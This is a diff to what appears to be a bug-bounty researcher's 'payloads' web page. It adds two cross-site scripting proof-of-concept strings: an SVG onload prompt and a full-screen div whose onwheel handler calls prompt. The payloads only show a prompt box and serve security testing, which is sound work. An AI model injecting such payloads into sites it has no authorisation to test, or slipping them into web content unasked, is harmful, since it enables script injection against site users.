@@ -29,7 +29,16 @@ permalink: /payloads
         http://[REDACTED]-sitemap-[REDACTED].s3.amazonaws.com/hackeronejosh.html
       </code>
     </h4>
-
+    <h4>
+      <code>
+        "&gt;&lt;svg/on/onload=prompt`${"XSS"}`&gt;
+      </code>
+    </h4>
+    <h4>
+      <code>
+        &quot;&gt;&lt;div onwheel=self['prompt']`XSS` style=&quot;width: 100vw;height: 100vw; z-index: 4;position: fixed;top: 0;left:0;&quot;&gt;&lt;/div&gt;
+      </code>
+    </h4>
     <br>
     <h4>
       I'm not a designer so there is no back button.
